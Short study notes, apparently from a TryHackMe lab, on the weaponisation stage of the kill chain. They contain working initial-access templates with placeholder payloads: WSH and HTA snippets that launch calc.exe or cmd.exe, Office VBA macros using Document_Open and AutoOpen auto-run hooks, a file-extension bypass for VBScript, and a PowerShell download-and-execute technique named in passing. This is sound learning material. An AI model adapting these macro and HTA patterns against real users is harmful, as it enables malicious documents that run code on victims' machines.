
Weaponisation is the second stage of the kill chain
goal is to use malicious weapon to exploit target and gain initial access

## Windows Scripting host (WSH)

uses cscript and wscript 

we can use wscript to create a shell object which can then be used to run exe files
e.g. Calc payload
```vb
Set shell = WScript.CreateObject("Wscript.Shell")
shell.Run("C:\Windows\System32\calc.exe " & WScript.ScriptFullName),0,True
```

A bypass to having the files saved as `.vbs` is to use a txt file and invoke vbs using `wscript /e:VBScript payload.txt`

## HTA (HTML Application)
```html
<html>
<body>
<script>
	var c= 'cmd.exe'
	new ActiveXObject('WScript.Shell').Run(c);
</script>
</body>
</html>
```

ActiveXObject same as Wscript.CreateObject

can create malicious HTA using metasploit > easiest way

## VBA
office macro time baby

```vb
Sub Document_Open()
  THM
End Sub

Sub AutoOpen()
  THM
End Sub

Sub THM()
   MsgBox ("Welcome to Weaponization Room!")
End Sub
```

calc payload:
```vb
Sub PoC()
	Dim payload As String
	payload = "calc.exe"
	CreateObject("Wscript.Shell").Run payload,0
End Sub
```

## POWERSHELL

use iex to download string and then run it

## Simulation

lets use a VBA